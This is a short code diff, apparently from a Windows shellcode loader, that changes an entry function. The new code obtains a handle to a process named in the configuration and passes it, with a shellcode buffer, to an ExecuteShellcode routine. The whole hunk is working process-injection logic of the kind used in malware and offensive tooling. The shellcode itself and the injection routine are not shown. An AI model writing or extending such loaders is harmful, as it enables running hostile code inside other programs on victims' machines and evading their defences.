@@ -23,23 +23,20 @@ VOID entry(void)
 	DWORD	pid = 0;
 	HANDLE	process_handle = NULL;
 
-	// pid = (int)utils::GetProcessId(CONFIG_EXECUTION_TARGET_NAME);
-	// if (!pid)
-	// {
-	// 	LOG_ERROR("Error getting process handle.");
-	// 	return;
-	// }
-	//
-	// if (pid)
-	// {
-	// 	LOG_INFO("Obtained PID of %s. (PID: %d)", CONFIG_EXECUTION_TARGET_NAME, pid);
-	// 	// utils::GetProcessHandle(pid);
-	// }
-	//
-	// if (!ExecuteShellcode((HANDLE)process_handle, shellcode))
-	// {
-	// 	LOG_ERROR("Failed to execute shellcode.");
-	// }
+	utils::GetProcessHandle(CONFIG_EXECUTION_TARGET_NAME, &pid, &process_handle);
+	if (pid == 0 || process_handle == NULL)
+	{
+		LOG_ERROR("Error getting process handle.");
+		return;
+	}
+
+	// LOG_INFO("Obtained PID of %s. (PID: %d)", CONFIG_EXECUTION_TARGET_NAME, pid);
+	// process_autils::GetProcessHandle(pid);
+
+	if (!ExecuteShellcode(process_handle, shellcode))
+	{
+		LOG_ERROR("Failed to execute shellcode.");
+	}
 }
 
 #pragma region [alternate entrypoints]
